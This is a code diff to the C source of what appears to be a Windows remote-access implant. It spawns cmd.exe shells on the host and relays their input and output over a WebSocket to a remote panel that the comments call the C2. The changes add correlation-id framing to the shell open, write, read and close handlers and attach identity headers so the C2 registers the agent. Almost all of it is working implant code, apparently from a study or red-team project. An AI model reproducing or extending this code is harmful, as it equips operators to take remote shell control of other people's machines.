@@ -87,6 +87,7 @@
 #include "shell.h"
 #include "report.h"
 #include "system_facts.h"
+#include "identity_headers.h" /* X-Agent-* identity on the upgrade */
 #include "types.h"
 #include "wintypes.h"
 #include "memory.h"
@@ -100,7 +101,6 @@
  * -DAGENT_COMMIT_HASH="<8-char git hash>"; local builds keep the study tag. */
 /* CI passes -DAGENT_COMMIT_HASH="<8 hex chars>" AND -DAGENT_COMMIT_HASH_DEFINED;
  * local builds fall back to a stack-built tag (a literal would sit in .rdata). */
-
 /* ==========================================================================
  * Command handlers (one reply per request, except Exit)
  * ======================================================================== */
@@ -115,37 +115,66 @@ typedef struct {
     const WINHTTP_API *winhttp;  /* session table, owned by run_session */
 } agent_ctx;
 
+/* ==========================================================================
+ * v3 framing (the command pool protocol this agent must speak):
+ *
+ *   request  [opcode][corrId:4 LE][payload...]
+ *   reply    [status:4 LE][corrId:4 LE][body...]
+ *
+ * The panel splices a correlation id into every command AFTER the opcode
+ * (AgentCommandPool.SpliceCorrelationId) and matches the id the agent
+ * echoes in its reply (StripCorrelationId reads it at offset 4). A reply
+ * without the echo is "unmatched" and silently dropped by the panel -
+ * which is exactly what made shells look dead while the agent was
+ * answering fine. Payload offsets below are therefore +4 vs the v4
+ * layout (shellId starts at byte 5, not byte 1; body starts at byte 8
+ * of the reply, not byte 4).
+ * ======================================================================== */
+
+/* Extract the u32 LE at data[off..off+4). */
+static unsigned read_u32_le_at(const unsigned char *data, int off)
+{
+    return (unsigned)data[off]
+         | ((unsigned)data[off + 1] << 8)
+         | ((unsigned)data[off + 2] << 16)
+         | ((unsigned)data[off + 3] << 24);
+}
+
 /* OpenShell: find a free pool slot (the slot index IS the shell id). */
-static DWORD handle_open_shell(const agent_ctx *ctx, unsigned char *reply, DWORD *reply_len)
+static DWORD handle_open_shell(const agent_ctx *ctx, unsigned int corr_id,
+                               unsigned char *reply, DWORD *reply_len)
 {
     int id = shell_open(ctx->shells);
 
     if (id < 0) {
-        unsigned char status_error[4] = {1, 0, 0, 0};
+        unsigned char status_error[8] = {1, 0, 0, 0, 0, 0, 0, 0};
+        write_u32_le_at(status_error, 4, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
         LOG_ERROR("OpenShell failed - replied status 1\n");
         return STATUS_ERROR;
     }
 
-    /* Exactly 12 bytes: the panel reads the id only when the
-     * reply is at least this long, else it assumes id 0. */
+    /* [status:4][corrId:4][shellId:8] = 16 bytes: the panel strips the
+     * corrId and reads the id from its historical offset 4. */
     int pos = 0;
     write_u32_le(reply, &pos, STATUS_OK);
+    write_u32_le(reply, &pos, corr_id);
     write_u64_le(reply, &pos, (unsigned long long)id);
-    *reply_len = 12;
+    *reply_len = 16;
     LOG_INFO("Shell %d opened (cmd.exe spawned) - id prepared\n", id);
     return STATUS_OK;
 }
 
-/* WriteShell: [shellId:8][UTF-8 input + NUL]. The panel already appends
- * "\n" to commands - appending another newline would execute every
- * command twice. */
+/* WriteShell payload: [shellId:8][UTF-8 input + NUL]. The panel already
+ * appends "\n" to commands - appending another newline would execute
+ * every command twice. */
 static DWORD handle_write_shell(const agent_ctx *ctx, const incoming_message *msg,
+                                    unsigned int corr_id,
                                     unsigned char *reply, DWORD *reply_len)
 {
     unsigned long long id = 0;
-    for (int i = 8; i >= 1; i--)
+    for (int i = 12; i >= 5; i--)
         id = (id << 8) | msg->data[i];
 
     shell_slot *slot = shell_lookup(ctx->shells, id);
@@ -153,17 +182,16 @@ static DWORD handle_write_shell(const agent_ctx *ctx, const incoming_message *ms
     if (slot) {
         /* Strip trailing NUL(s); "\x03" passes through as Ctrl+C. */
         DWORD end = msg->length;
-        while (end > 9 && msg->data[end - 1] == '\0')
+        while (end > 13 && msg->data[end - 1] == '\0')
             end--;
-        if (end > 9 && shell_write(slot, msg->data + 9, end - 9) == 0)
+        if (end > 13 && shell_write(slot, msg->data + 13, end - 13) == 0)
             status = STATUS_OK;
     }
 
-    reply[0] = (unsigned char)status;
-    reply[1] = 0;
-    reply[2] = 0;
-    reply[3] = 0;
-    *reply_len = 4;
+    int pos = 0;
+    write_u32_le(reply, &pos, (DWORD)status);
+    write_u32_le(reply, &pos, corr_id);
+    *reply_len = 8;
     LOG_INFO("Write to shell %llu - status %d\n", id, status);
     return (DWORD)status;
 }
@@ -171,43 +199,47 @@ static DWORD handle_write_shell(const agent_ctx *ctx, const incoming_message *ms
 /* ReadShell: drain what the shell has buffered. An empty chunk is legal
  * (that is "idle"); a dead shell reports status 1. */
 static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg,
+                                   unsigned int corr_id,
                                    unsigned char *reply, DWORD *reply_len)
 {
     unsigned long long id = 0;
-    for (int i = 8; i >= 1; i--)
+    for (int i = 12; i >= 5; i--)
         id = (id << 8) | msg->data[i];
 
     shell_slot *slot = shell_lookup(ctx->shells, id);
     if (!slot) {
-        unsigned char status_error[4] = {1, 0, 0, 0};
+        unsigned char status_error[8] = {1, 0, 0, 0, 0, 0, 0, 0};
+        write_u32_le_at(status_error, 4, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
         LOG_ERROR("Read shell %llu - unknown id, status 1\n", id);
         return STATUS_ERROR;
     }
 
-    /* [status:4][chunk][NUL] reply, 64K+5 on the frame; the prologue's
-     * stack probe makes a frame this large legal. */
-    unsigned char chunk[4 + SHELL_READ_CHUNK + 1];
+    /* [status:4][corrId:4][chunk][NUL] reply; the prologue's stack probe
+     * makes a frame this large legal. */
+    unsigned char chunk[8 + SHELL_READ_CHUNK + 1];
     DWORD got = 0;
-    int r = shell_read(slot, chunk + 4, SHELL_READ_CHUNK, &got);
+    int r = shell_read(slot, chunk + 8, SHELL_READ_CHUNK, &got);
 
     if (r == SHELL_READ_DEAD) {
-        unsigned char status_error[4] = {1, 0, 0, 0};
+        unsigned char status_error[8] = {1, 0, 0, 0, 0, 0, 0, 0};
+        write_u32_le_at(status_error, 4, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
         LOG_ERROR("Shell %llu exited - status 1, slot freed\n", id);
         return STATUS_ERROR;
     }
 
-    /* [status:4][chunk][NUL] - the NUL terminator is part of the
-     * v4 contract and is written explicitly (the panel strips
-     * exactly one). An empty chunk = "idle". */
+    /* The NUL terminator is part of the contract and is written
+     * explicitly (the panel strips exactly one). An empty chunk =
+     * "idle". */
     int pos = 0;
     write_u32_le(chunk, &pos, STATUS_OK);
-    chunk[4 + got] = '\0';
-    MemoryCopy(reply, chunk, 4 + got + 1);
-    *reply_len = 4 + got + 1;
+    write_u32_le(chunk, &pos, corr_id);
+    chunk[8 + got] = '\0';
+    MemoryCopy(reply, chunk, 8 + got + 1);
+    *reply_len = 8 + got + 1;
     if (r == SHELL_READ_IDLE)
         LOG_INFO("Read shell %llu - idle\n", id);
     else
@@ -217,10 +249,11 @@ static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg
 
 /* CloseShell: "close and forget" - unknown ids still get status 0. */
 static DWORD handle_close_shell(const agent_ctx *ctx, const incoming_message *msg,
+                                    unsigned int corr_id,
                                     unsigned char *reply, DWORD *reply_len)
 {
     unsigned long long id = 0;
-    for (int i = 8; i >= 1; i--)
+    for (int i = 12; i >= 5; i--)
         id = (id << 8) | msg->data[i];
 
     shell_slot *slot = shell_lookup(ctx->shells, id);
@@ -231,12 +264,10 @@ static DWORD handle_close_shell(const agent_ctx *ctx, const incoming_message *ms
         LOG_INFO("Close shell %llu - not open (still ok)\n", id);
     }
 
-    reply[0] = 0;
-    reply[1] = 0;
-    reply[2] = 0;
-    reply[3] = 0;
-    *reply_len = 4;
-    LOG_INFO("No error reply prepared for CloseShell %llu\n", id);
+    int pos = 0;
+    write_u32_le(reply, &pos, STATUS_OK);
+    write_u32_le(reply, &pos, corr_id);
+    *reply_len = 8;
     return STATUS_OK;
 }
 
@@ -395,7 +426,30 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
         goto cleanup;
     }
 
-    if (!winhttp.WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+    /* The X-Agent-* identity block rides the upgrade request itself (API
+     * 1 - identity_headers.h). Without it the relay still accepts the
+     * socket but the C2 never registers the agent (no UUID), and none of
+     * its windows open - build it, widen it, send it. */
+    CHAR headers_a[IDENTITY_HEADERS_SIZE];
+    USIZE headers_len = build_identity_headers(headers_a);
+    if (headers_len == 0) {
+        LOG_ERROR("identity header block does not fit\n");
+        rc = RC_LOCAL_ERROR;
+        goto cleanup;
+    }
+    WCHAR headers_w[IDENTITY_HEADERS_SIZE];
+    if (AnsiToWide(headers_a, headers_w, IDENTITY_HEADERS_SIZE) < 0) {
+        LOG_ERROR("identity header block conversion failed\n");
+        rc = RC_LOCAL_ERROR;
+        goto cleanup;
+    }
+    LOG_INFO("Identity: %lu header bytes on the upgrade request\n",
+           (unsigned long)headers_len);
+
+    /* dwHeadersLength counts CHARACTERS (the wide-API contract), not
+     * bytes - passing byte length fails with ERROR_INVALID_PARAMETER. */
+    if (!winhttp.WinHttpSendRequest(request, headers_w,
+                          (DWORD)headers_len,
                             WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
         LOG_ERROR("WinHttpSendRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup;
     }
@@ -443,10 +497,16 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
 
         unsigned char opcode = (msg.length > 0) ? msg.data[0] : 0xFF;
 
+        /* v3: [opcode][corrId:4][payload] - the correlation id rides every
+         * command and MUST be echoed in the reply (see the framing block
+         * above the handlers). */
+        unsigned int corr_id = (msg.length >= 5) ? read_u32_le_at(msg.data, 1) : 0;
+
         /* A message that overflowed the receive buffer is refused whole:
          * executing its head would run half a command. */
         if (msg.truncated) {
-            unsigned char status_error[4] = {1, 0, 0, 0};
+            unsigned char status_error[8] = {1, 0, 0, 0, 0, 0, 0, 0};
+            write_u32_le_at(status_error, 4, corr_id);
             err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
             if (err == NO_ERROR) {
                 LOG_ERROR("Message over %d bytes - refused, status 1\n",
@@ -463,30 +523,27 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
             goto cleanup;               /* spec: terminate immediately  */
         }
 
-        unsigned char reply[4 + SHELL_READ_CHUNK + 1];
+        unsigned char reply[8 + SHELL_READ_CHUNK + 1];
         DWORD reply_len = 0;
-        // if (opcode == CMD_HELLO) {
-        //     err = handle_hello(ctx, reply, &reply_len);
-        //     if (err == NO_ERROR)
-        //         err = ws_send(ctx->winhttp, socket, reply, reply_len);
-         if (opcode == CMD_OPEN_SHELL) {
-            err = handle_open_shell(ctx, reply, &reply_len);
+        if (opcode == CMD_OPEN_SHELL) {
+            err = handle_open_shell(ctx, corr_id, reply, &reply_len);
             if (err == NO_ERROR || err == STATUS_ERROR)
                 err = ws_send(ctx->winhttp, socket, reply, reply_len);
-        } else if (opcode == CMD_WRITE_SHELL && msg.length >= 9) {
-            err = handle_write_shell(ctx, &msg, reply, &reply_len);
+        } else if (opcode == CMD_WRITE_SHELL && msg.length >= 13) {
+            err = handle_write_shell(ctx, &msg, corr_id, reply, &reply_len);
             if (err == STATUS_OK || err == STATUS_ERROR)
                 err = ws_send(ctx->winhttp, socket, reply, reply_len);
-        } else if (opcode == CMD_READ_SHELL && msg.length >= 9) {
-            err = handle_read_shell(ctx, &msg, reply, &reply_len);
+        } else if (opcode == CMD_READ_SHELL && msg.length >= 13) {
+            err = handle_read_shell(ctx, &msg, corr_id, reply, &reply_len);
             if (err == STATUS_OK || err == STATUS_ERROR)
                 err = ws_send(ctx->winhttp, socket, reply, reply_len);
-        } else if (opcode == CMD_CLOSE_SHELL && msg.length >= 9) {
-            err = handle_close_shell(ctx, &msg, reply, &reply_len);
+        } else if (opcode == CMD_CLOSE_SHELL && msg.length >= 13) {
+            err = handle_close_shell(ctx, &msg, corr_id, reply, &reply_len);
             if (err == STATUS_OK || err == STATUS_ERROR)
                 err = ws_send(ctx->winhttp, socket, reply, reply_len);
         } else {                        /* not implemented: status = 1 */
-            unsigned char status_error[4] = {1, 0, 0, 0};
+            unsigned char status_error[8] = {1, 0, 0, 0, 0, 0, 0, 0};
+            write_u32_le_at(status_error, 4, corr_id);
             err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
             if (err == NO_ERROR) {
                 LOG_INFO("Command 0x%02x not implemented - replied status 1\n",
